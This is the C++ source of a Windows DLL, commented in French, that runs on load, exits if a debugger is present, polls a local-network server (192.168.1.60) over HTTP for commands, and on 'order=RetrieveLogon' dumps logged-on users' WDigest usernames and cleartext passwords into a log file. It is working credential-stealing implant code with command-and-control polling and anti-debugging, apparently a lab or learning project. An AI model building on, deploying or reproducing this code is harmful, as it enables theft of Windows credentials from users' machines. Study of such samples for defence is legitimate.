// YoloDll.cpp : définit les fonctions exportées pour l'application DLL.
//

#include "stdafx.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <stdlib.h>
#include <ws2tcpip.h>
#include "WDigestInspector.h"
#pragma comment(lib,"ws2_32.lib")

#define EOF (-1)


#ifdef __cplusplus    // If used by C++ code, 
extern "C" {          // we need to export the C interface
#endif

	VOID pollServer();
	void setLogFileDll();

	BOOL __stdcall _DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
	{
		pollServer();
		return TRUE;
	}

	VOID pollServer() {
		setLogFileDll();
		printf("Start Polling \n");
		// Si le programme est en train d'être debuggé on s'arrête
		if (IsDebuggerPresent()) return;
		WSADATA wsaData;
		SOCKET Socket;
		SOCKADDR_IN SockAddr;
		int lineCount, rowCount, i, nDataLength;
		char buffer[10000];
		struct hostent *host;
		char *response;
		int cbResponse;
		int count = 0;
		while (count < 3)
		{
			count+= 1;
			lineCount = 0;
			rowCount = 0;
			cbResponse = 0;
			host = NULL;
			i = 0;
			response = (char*)malloc(2000 * sizeof(char));
			response[0] = '\0';

			// Ici on indique l'url à utiliser
			char url[] = "192.168.1.60";

			// On forge la requête http
			char *httpRequest;
			httpRequest = (char *)malloc(500 * sizeof(char));
			httpRequest[0] = '\0';
			lstrcatA(httpRequest, "GET / HTTP/1.1\r\nHost: ");
			lstrcatA(httpRequest, url);
			lstrcatA(httpRequest, "\r\nConnection: close\r\n\r\n");

			if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
				Sleep(2000);
				continue;
			}

			Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			// On récupère l'IP
			host = gethostbyname(url);
			// On configure le socket pour du IPv4 port 80 vers l'adresse distante host
			SockAddr.sin_port = htons(80);
			SockAddr.sin_family = AF_INET;
			SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
			// On démarre le socket
			if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0){
				Sleep(2000);
				continue;
			}

			// On envoie les données via celui-ci
			send(Socket, httpRequest, strlen(httpRequest), 0);

			// On récupère les données
			while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
				i = 0;
				while ((buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') && nDataLength > i){
					response[cbResponse] = buffer[i];
					response[cbResponse + 1] = '\0';
					cbResponse++;
					i++;
				}
			}
			// C'est ici qu'on vérifie les ordres donnés
			PLOGON users = (PLOGON)LocalAlloc(LPTR, 15*sizeof(LOGON));
			char *username = (char*)malloc(50 * sizeof(char));
			if (strstr(response, "order=RetrieveLogon") != NULL){
				getLogons(users, 14);
				int i;
				for (i = 0; i < 15; i++) {
					if (!users[i].UserName || !users[i].Password){
						printf("No username or pasword\n");
						continue;
					}
					if (!wcstombs_s(NULL, username, 49, users[i].UserName->Buffer, users[i].UserName->Length)){
						printf("username: %s\n", username);
					}
					else printf("Error shit happens \n");
					wprintf(L"Username: %s \nPassword: %s\n", users[i].UserName->Buffer, users[i].Password->Buffer);
				}
			}
			closesocket(Socket);
			WSACleanup();
			printf("\n (%i)------------- \n", cbResponse);
			// Display HTML source 
			printf("%s\n", response);
			free(response);
			Sleep(3000);
		}
	}

	/*
	Juste une fonction pour pousser la sortie de printf vers un fichier au lieu de la sortie standard
	*/
	void setLogFileDll() {
		char filename[] = "C:\\yolo_dll_log.23.txt";
		FILE *out;
		freopen_s(&out, filename, "a+", stdout);
		printf("setLogFileDll OK.\n");
	}
#ifdef __cplusplus
}
#endif
